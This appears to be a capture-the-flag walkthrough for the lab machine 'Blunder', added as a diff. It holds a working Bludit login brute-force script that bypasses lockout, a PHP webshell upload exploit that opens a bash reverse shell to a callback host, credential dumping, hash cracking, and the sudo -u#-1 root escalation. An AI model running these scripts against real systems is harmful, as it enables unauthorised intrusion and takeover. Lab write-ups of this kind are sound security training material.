@@ -1,0 +1,206 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.10.191
+result:
+Open 10.10.10.191:80
+
+command: sudo nmap -sSVC -A -p 80 10.10.10.191
+result:
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Blunder | A blunder of interesting facts
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-generator: Blunder
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.0 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 2.6.32 (91%), Linux 5.0 - 5.3 (90%), Crestron XPanel control system (90%), Linux 5.4 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   119.79 ms 10.10.16.1
+2   169.94 ms 10.10.10.191
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.90 seconds
+
+command: gobuster dir -u http://10.10.10.191 -w /snap/seclists/34/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x txt
+result:
+/about                (Status: 200) [Size: 3281]
+/0                    (Status: 200) [Size: 7562]
+/admin                (Status: 301) [Size: 0] [--> http://10.10.10.191/admin/]
+/robots.txt           (Status: 200) [Size: 22]
+/todo.txt             (Status: 200) [Size: 118]
+/usb                  (Status: 200) [Size: 3960]
+/LICENSE              (Status: 200) [Size: 1083]
+
+access: http://10.10.10.191/todo.txt
+result:
+-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+
+access: http://10.10.10.191/admin/
+take attention: BLUDIT
+
+command: searchsploit bludit
+------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                    |  Path
+------------------------------------------------------------------ ---------------------------------
+Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass       | php/webapps/48746.rb
+Bludit - Directory Traversal Image File Upload (Metasploit)       | php/remote/47699.rb
+Bludit 3-14-1 Plugin 'UploadPlugin' - Remote Code Execution (RCE) | php/webapps/51160.txt
+Bludit 3.13.1 - 'username' Cross Site Scripting (XSS)             | php/webapps/50529.txt
+Bludit 3.9.12 - Directory Traversal                               | php/webapps/48568.py
+Bludit 3.9.2 - Auth Bruteforce Bypass                             | php/webapps/48942.py
+Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)      | php/webapps/49037.rb
+Bludit 3.9.2 - Directory Traversal                                | multiple/webapps/48701.txt
+Bludit 4.0.0-rc-2 - Account takeover                              | php/webapps/51360.txt
+Bludit CMS v3.14.1 - Stored Cross-Site Scripting (XSS) (Authentic | php/webapps/51476.txt
+bludit Pages Editor 3.0.0 - Arbitrary File Upload                 | php/webapps/46060.txt
+------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+command: cewl http://10.10.10.191 > wordlist
+let's create our custom brute force script:
+code:
+import re
+import requests
+import sys
+
+host = 'http://10.10.10.191'
+login_url = host + '/admin/login'
+username = 'fergus'
+
+with open(sys.argv[1], 'r') as f:
+    wordlist = [x.strip() for x in f.readlines()]
+
+for password in wordlist:
+    session = requests.Session()
+    login_page = session.get(login_url)
+    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+
+    print(f'\r[*] Trying: {password:<90}'.format(p = password), end="", flush=True)
+
+    headers = {
+        'X-Forwarded-For': password,
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+        'Referer': login_url
+    }
+
+    data = {
+        'tokenCSRF': csrf_token,
+        'username': username,
+        'password': password,
+        'save': ''
+    }
+
+    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+
+    if 'location' in login_result.headers:
+        if '/admin/dashboard' in login_result.headers['location']:
+            print('\rSUCCESS: Password found!' + 50*" ")
+            print(f'Use {username}:{password} to login.')
+            print()
+            break
+
+command: python3 brute_script_1.py wordlist
+result:
+SUCCESS: Password found!                                                                              
+Use fergus:RolandDeschain to login.
+
+let's create our rce exploit:
+code:
+import netifaces as ni
+import re
+import requests
+
+callback_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
+username = 'fergus'
+password = 'RolandDeschain'
+url = 'http://10.10.10.191'
+
+s = requests.session()
+
+# Login
+resp = s.get(f'{url}/admin/')
+csrf = re.findall('name="tokenCSRF" value="([0-9a-f]{32,})"', resp.text)[0]
+s.post(f'{url}/admin/', allow_redirects=False,
+        data = {'tokenCSRF': csrf, 'username': username, 'password': password, 'remember': 'true', 'save': ''})
+
+# Get CSRF to upload images
+resp = s.get(f'{url}/admin/new-content/index.php')
+csrf = re.findall('\nvar tokenCSRF = "([0-9a-f]{32,})";', resp.text)[0]
+
+# Upload webshell
+form_data = {'images[]': ('0xdf.php', '<?php system($_REQUEST["cmd"]); ?>', 'image/png')}
+data = {'uuid': 'junk',
+        'tokenCSRF': csrf}
+s.post(f'{url}/admin/ajax/upload-images', data=data, files=form_data, allow_redirects=False)
+
+# Upload .htaccess file
+form_data = {'images[]': ('.htaccess', 'RewriteEngine off', 'image/png')}
+s.post(f'{url}/admin/ajax/upload-images', data=data, files=form_data, allow_redirects=False)
+
+# Trigger Shell
+resp = s.get(f'{url}/bl-content/tmp/0xdf.php', params={'cmd':f'bash -c "bash -i >& /dev/tcp/{callback_ip}/4444 0>&1"'})
+
+
+command: nc -lvnp 4444
+command: python3 exploit.py
+
+command: cd /var/www/bludit-3.10.0a/bl-content/databases
+command: cat users.php
+result:
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+}
+
+access: https://sha1.gromweb.com/?hash=faca404fd5c0a31cf1897b823c695c85cffeb98d
+result:
+Password120
+
+command: su - hugo
+password: Password120
+
+command: sudo -l
+Password: Password120
+
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+
+command: sudo --version
+sudo --version
+Sudo version 1.8.25p1
+Sudoers policy plugin version 1.8.25p1
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.25p1
+
+command: sudo -u#-1 /bin/bash
+command: cat root.txt
+ab77e4350b3cd178f037bae24a9ddd00
+
+resource: 
+https://0xdf.gitlab.io/
